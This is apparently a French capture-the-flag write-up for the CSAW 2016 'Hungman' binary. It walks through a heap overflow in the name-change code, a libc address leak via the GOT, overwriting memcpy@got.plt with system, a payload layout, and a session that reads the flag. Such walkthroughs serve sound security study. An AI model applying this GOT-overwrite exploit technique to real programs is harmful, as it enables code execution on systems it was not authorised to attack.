#Hungman

Pas si simple ce challenge.
Toute se passe dans la boucle
```C
      puts("High score! change name?");
      __isoc99_scanf(" %c", &v3);
      if ( v3 == 121 )
      {
        s = malloc(0xF8uLL);
        memset(s, 0, 0xF8uLL);
        v8 = read(0, s, 0xF8uLL);
        *(_DWORD *)(nom + 4) = v8;
        v14 = strchr((const char *)s, 10);
        if ( v14 )
          *v14 = 0;
        memcpy(*(void **)(nom + 8), s, v8); // ecrasement de nom: nom+0 = score, nom + 4 
        free(s);
      }
```

De la fonction jouant la partie. Le memcpy permet d'écraser l'association High score et nom.
En gros en mémoire on a successivement:

```
s:[buffer contenant le nom] nom:[[Hight score et longueur nom][pointeur vers le nom]]
```
Lorsque l'on copies sur nom plus 8 la première fois, on peut écraser nom + 8
et donc le pointeur vers le nom.

* La première fois on se contente de pointer vers __libc_start_main ce qui permet
d'avoir l'adresse de base de la libc et donc de récupérercelle de system. On met le HScore
à 0 pour être sur de gagner

* La deuxième fois, nom pointe vers  __libc_start_main
```
(gdb) x/gx 0x602068
0x602068 <__libc_start_main@got.plt>:	0x00007ffff7a52a50
(gdb) x/gx 0x602070
0x602070 <__gmon_start__@got.plt>:	0x00000000004008b6
(gdb) x/gx 0x602078
0x602078 <memcpy@got.plt>:	0x00007ffff7ac3020
(gdb) x/gx 0x602080
0x602080 <malloc@got.plt>:	0x00000000004008d6
0x602088 <setvbuf@got.plt>:	0x00007ffff7a9d0a0
```

on va écraser memcpy@got.plt par l'adresse de system, la fois suivante, la chaine pointée par
non+8 (donc en __libc_start_main@got.plt) sera executée par system. Il faut donc mettre une
commande en  __libc_start_main@got.plt et écraser memcpy@got.plt. Se faisant on modifiera
malloc@got.plt ce qui fera planter le programme. Il faut donc aller encore plus loin
jusqu'à setvbuf. Cela conduit à un nom de la forme

```
CMD+"\x00"+"D"*(15-len(CMD))+adr_to_str32(SYSTEM)+adr_to_str32(MALLOC)
```
Il faut donc gagner 3 fois de suite. Cela se fait en envoyant successivement les lettres
de l'alphabet.

Bizarrement le /bin/sh n'est pas interactif, les commandes sont envoyées directement:

Voilà la session obtenue:

```
francois@athos:~/BFF/beers4flags/writeups/csaw2016/pwn/Hungman$ python jeu-final.py 1 ls
START= 00007efe859a5740
SYSTEM= 00007efe859ca380
flag.txt
hungman

Highest player: ls score: 142
Continue? 
francois@athos:~/BFF/beers4flags/writeups/csaw2016/pwn/Hungman$ python jeu-final.py 1 'cat flag.txt'
START= 00007fab020ff740
SYSTEM= 00007fab02124380
flag{this_looks_like_its_a_well_hungman}

Highest player: cat flag.txt score: 70
Continue? 
francois@athos:~/BFF/beers4flags/writeups/csaw2016/pwn/Hungman$ 
```
